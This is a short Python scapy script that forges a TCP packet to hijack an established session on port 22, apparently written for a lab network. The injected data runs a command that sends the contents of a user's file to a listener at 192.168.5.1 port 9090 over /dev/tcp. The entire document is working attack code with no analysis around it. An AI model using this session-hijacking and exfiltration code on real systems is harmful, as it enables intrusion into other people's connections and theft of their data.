#!/usr/bin/python3

import sys
from scapy.all import *

print("SENDING HIJECT PACKET......")

IPLayer = IP(src="192.168.5.1", dst="192.168.5.2")
TCPLayer = TCP(sport=50038, dport=22, flags="A", seq=3891311331, ack=3242696456)

Data = "\r cat /home/kano/z.txt > /dev/tcp/192.168.5.1/9090\r"
pkt = IPLayer/TCPLayer/Data

send(pkt, verbose=0)
